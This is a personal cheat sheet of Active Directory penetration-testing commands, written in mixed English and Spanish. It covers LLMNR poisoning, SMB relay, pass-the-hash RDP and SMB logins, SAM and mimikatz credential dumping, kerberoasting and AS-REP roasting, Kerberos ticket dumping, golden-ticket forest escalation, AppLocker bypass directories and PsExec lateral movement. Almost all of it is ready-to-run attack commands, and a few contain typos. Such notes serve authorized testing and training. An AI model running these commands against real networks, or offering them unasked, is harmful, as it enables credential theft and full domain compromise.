# Notes Active Directory Pentest
@far00t01

## Discovery 
### fping for a list of available hosts:

`fping -a -g 10.10.10.0/24 2>/dev/null | tee alive_hosts.txt`

### Subnet host with Remote Desktop Protocol (RDP) enabled:
`nmap -Pn -vv -p3389 -iL alive_hosts.txt -oN output_host_3389.txt`

### RDP connection

Hash

`sudo xfreerdp /u:administrator /pth:3542d79d5d17bc9d3014d4d56b5e3060 /v:10.10.10.100`

## Relay Attacks en Active Directory

### LLMNR Poisoning
Link-Local Multicast Name Resolution (LLMNR) is a DNS resolution protocol that does not require a DNS server. LLMNR attempts to resolve a DNS request that DNS could not fulfill. LLMNR poisoning will provide the NTLMv2 hash, which can be used to decrypt using a hash decryption tool such as Hashcat or John the Ripper. 
En primer lugar, se requiere que todos los servicios están activados con Responder.

`sudo nano /etc/responder/Responder.conf`

`sudo responder -I eth0 -dwv`

`hashcat -m 5600 <ntlmv2 hash file> <password list>`
(-m 5600 is the option from Hashcat to crack NTLMv2 hashes.)


### SMB Relay Attack
An SMB relay attack consists of an attacker capturing a user's NTLM hash and relaying it to another machine on the network. He impersonates the user and authenticates against SMB to gain shell or file access.

### Generate a list of relayable hosts (SMB Signing disabled)

`crackmapexec smb 10.10.10.0/24 --gen-relay-list output.txt`

`sudo nano /etc/responder/Responder.conf`

Change the SMB and HTTP parameters to "off" and save the file.

`sudo responder -I eth0 -dwv`

Now run ntlmrelayx.py to relay the hash.

`ntlmrelayx.py -tf output.txt -smb2support`


### Check Null Sessions

`smbclient -L \\\\10.10.10.100`

`smbmap -H 10.10.10.100`

`enum4linux -U 10.10.10.100`

`rpcclient -U "" -N 10.10.10.100`


### BloodHound installation
https://www.kali.org/tools/bloodhound/


# Enumeration Active Directory (Automatic) without credentials

### Anonymous LDAP:

`ldapsearch -h 10.10.10.100 389 -x -s base -b ‘’ “(objectClass=*)” “*” +`

LinWinPwn is a bash script that automates a series of Active Directory Enumeration and Vulnerability checks. The script uses a number of tools and serves as a tool wrapper. The tools include: impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound, and others.

Clone LinWinPwn repository:

`git clone https://github.com/lefayjey/linWinPwn`

We give the necessary permissions and install. 

`cd linWinPwn; chmod +x linWinPwn.sh`

`chmod +x install.sh`

`./install.sh`

Usage options: 

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com`


# Enumeracion de Active Directory con credenciales.

ldapdomaindump is a tool that aims to solve this problem by collecting and parsing the information available through LDAP and displaying it in a human-readable HTML format, as well as in machine-readable json and csv/tsv/greppable files.
The tool was designed with the following objectives in mind:

The tool generates several files containing an overview of the domain objects:

* domain_groups: List of domain groups

* domain_users: List of domain users

* domain_computers: List of computer accounts on the domain

* domain_policy: Domain policy, such as password requirements and lockout policy

* domain_trusts: Inbound and outbound domain trusts and their properties

In addition to two grouped files:

* domain_users_by_group: Domain users by group they belong to
* 
* domain_computers_by_os: Sorting the computers in the domain by operating system

### Tool installation: 

Clone the repository:
`git clone https://github.com/dirkjanm/ldapdomaindump`

We execute by entering the credentials of our user + ip of the domain controller. 

`python3 ldapdomaindump.py --user "domain\user" -p 'password' ldap://10.10.10.100:389 --no-json --no-grep -o output`

### Enumeration Ldapsearch autenticated

`ldapsearch -x -H ldap://10.10.10.100 -D 'domain@domain.com' -w 'password' -b "DC=domain,DC=com"`

### Enumeracion de Active Directory de forma automatica

Clone the LinWinPwn repository: 

`git clone https://github.com/lefayjey/linWinPwn`

We give the necessary permissions and install. 

`cd linWinPwn; chmod +x linWinPwn.sh`

`chmod +x install.sh`

`./install.sh`

Usage options: 

Credentialed use

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u testing -p servicess -M user`

Use with Hash authentication

`./linWinPwn.sh -t 10.10.10.100 -o local.domain.com -u Administrator -p :3432e23aa4bc545.... -M pwd_dump`


### Administrator permissions are required:

## Dump local SAM hashes

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth --sam`


### Mimikatz module

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth -m enum_avproducts`

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz`

`crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'PASS' -M mimikazt`

`crackmapexec smb 10.10.10.100 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'`

`crackmapexec 10.10.10.100 -u 'Administrator' -p 'PASSWORD' --local-auth --shares`


### Enumerating Applocker Rules

Policy Applocker
`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

Esto debería mostrar los directorios permitidos donde podemos ejecutar nuestros propios binarios

`PS C:\Tools> (Get-AppLockerPolicy -Local).RuleCollections`

`PS C:\Tools> Get-AppLockerPolicy -Local -Effective -Xml | Set-Content ('C:\users\public\applockerpolicy.xml')`

Si AppLocker fue configurado con reglas por defecto, este directorio está en la lista blanca por defecto:

C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\Tasks
C:\windows\tracing


# Pass the Hash Attack
`$ crackmapexec smb <domain IPv4 IP address>/24 -u <SAM account name> -d <domain name>.local -H <NTLM hash>`

`$ crackmapexec smb <local IPv4 address>/24 -u <username> -H <NTLM hash> — local-auth`

Now run ntlmrelayx.py to relay the credentials, dump domain information, and create a new domain user.
`ntlmrelayx.py -6 -t ldaps://<domain controller IPv4 address> -wh fakewpad.<domain name>.local -l <name folder for domain information dumping>`

`secretsdump.py <domain name>/<mitm6 added user>@<domain controller IPv4 address>`


# ASREPRoast
Obtain Ticket Hash: 

`GetUserSPNs.py domain.com/user:password -outputfile hashes.kerberoast`

`GetNPUsers.py contoso.com/john.doe -no-pass`


### Run rubeus to dump tickets

`rubeus dump /service:krbtgt > output.txt`


## RaiseChild
This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids.

`python raiseChild.py childDomain.net/adminuser`

`python raiseChild.py childDomain.net/adminuser:mypwd`

`python raiseChild.py -hashes LMHASH:NTHASH childDomain.net/adminuser`

### This will save the final goldenTicket generated in the ccache target file

`python raiseChild.py -w ccache childDomain.net/adminuser`


# Lateral Movement With PsExec
PsExec is a lightweight telnet replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec’s most powerful uses include launching interactive command prompts on remote systems and remote-enabling tools like IpConfig that otherwise do not have the ability to show information about remote systems.

`./PsExec64.exe \\<TARGET-IP> -u Administrator -p <PASSWORD> ipconfig`


# Information NTML 
NTLM vs NTLMv1/v2 vs Net-NTLMv1/v2 

NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing. However, NTLM (without v1/v2) means something completely different.

NTLM hashes are stored in the SAM or NTDS database.
It is LMHASH:NTHASH

### Net-NTLM hashes are used for network authentication

You CAN perform Pass-The-Hash attacks with NTLM hashes
You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes

Interesting references:

https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/
https://learn.microsoft.com/es-es/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties


